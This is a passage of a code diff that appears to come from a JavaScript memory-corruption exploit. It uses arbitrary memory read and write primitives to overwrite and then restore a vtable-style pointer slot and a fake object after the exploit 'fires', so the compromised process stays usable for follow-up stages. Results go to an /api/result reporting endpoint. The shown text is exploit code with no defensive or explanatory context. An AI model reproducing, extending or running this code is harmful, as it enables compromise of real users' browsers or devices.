+                if(useRealVP)S.absWrite(VP+0x18n,realSlot3);
+                S.absWrite(FO,vpOrig);diagRestored=true;
+                FB2('B5/6 FO/slot3 restored to 0x'+vpOrig.toString(16));
+              }else if(!isDiag&&useRealVP){
+                /* The real fire also restores after the async window: the
+                 * parent stays usable for the child-executor follow-ups. */
+                var fReal=S.absRead(FO,8)[0];
+                fd2.FO='0x'+fReal.toString(16);
+                S.absWrite(VP+0x18n,realSlot3);
+                S.absWrite(FO,vpOrig);
+                FB2('BR real-VP slot3 + FO restored');
+              }
               try{var x2=new XMLHttpRequest();x2.open('POST','/api/result',false);x2.send(JSON.stringify({type:'result',fireSettled:fd2}));}catch(eX2){}
             }catch(eS2){}
           },500);
